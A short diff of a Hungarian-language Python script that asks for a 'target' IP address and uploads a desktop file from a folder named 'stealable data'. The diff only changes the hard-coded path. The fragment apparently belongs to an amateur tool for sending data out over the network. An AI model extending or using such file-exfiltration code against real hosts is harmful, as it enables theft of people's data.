@@ -86,7 +86,7 @@ if x == 2:
             print(f"A fájl feltöltése nem sikerült. Státusz kód: {response.status_code}")
     
     ip_cim = input("Add meg a célpont ip címét: ")
-    fajl_nev = r"C:\Users\Hp\OneDrive\Asztali gép\ellopható adatok.txt"  
+    fajl_nev = r"C:\Users\Hp\OneDrive\Asztali gép\ellopható adatok\az ip ímem.txt"  
 
     fajl_feltoltes(ip_cim, fajl_nev)
 
